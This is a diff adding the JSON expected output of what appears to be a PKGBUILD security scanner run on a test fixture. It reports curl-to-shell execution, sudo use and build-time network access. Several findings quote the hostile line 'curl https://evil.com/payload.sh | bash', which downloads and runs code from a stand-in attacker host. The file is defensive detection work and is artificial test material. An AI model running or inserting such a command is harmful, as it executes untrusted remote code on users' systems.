@@ -1,0 +1,103 @@
+{
+  "package_name": "malicious-curl-bash",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/curl-bash/PKGBUILD",
+        "line": 15,
+        "column": 5,
+        "snippet": "    curl https://evil.com/payload.sh | bash"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "curl https://evil.com/payload.sh | bash"
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.com/payload.sh",
+      "description": "This package downloads and executes code from https://evil.com/payload.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/curl-bash/PKGBUILD",
+        "line": 15,
+        "column": null,
+        "snippet": "curl https://evil.com/payload.sh | bash"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.com/payload.sh"
+        ]
+      }
+    },
+    {
+      "id": "PRIV-001",
+      "severity": "critical",
+      "category": "privilege_escalation",
+      "title": "Sudo usage in package()",
+      "description": "Function 'package' uses sudo, which should never be needed in PKGBUILDs",
+      "location": {
+        "file": "tests/fixtures/malicious/curl-bash/PKGBUILD",
+        "line": 18,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Remove sudo; makepkg handles permissions correctly",
+      "cwe_id": "CWE-250",
+      "metadata": {
+        "function": "package"
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'build' contains network access command 'curl'",
+      "location": {
+        "file": "tests/fixtures/malicious/curl-bash/PKGBUILD",
+        "line": 13,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "build",
+        "pattern": "curl"
+      }
+    },
+    {
+      "id": "SRC-005",
+      "severity": "medium",
+      "category": "configuration",
+      "title": "No sources with build function",
+      "description": "Package has build() function but no source array",
+      "location": {
+        "file": "tests/fixtures/malicious/curl-bash/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Verify this is intentional; build() usually needs sources",
+      "cwe_id": null,
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/curl-bash/PKGBUILD"
+  ],
+  "timestamp": "2026-06-15T13:48:49.418607657Z",
+  "scan_duration_ms": 6
+}
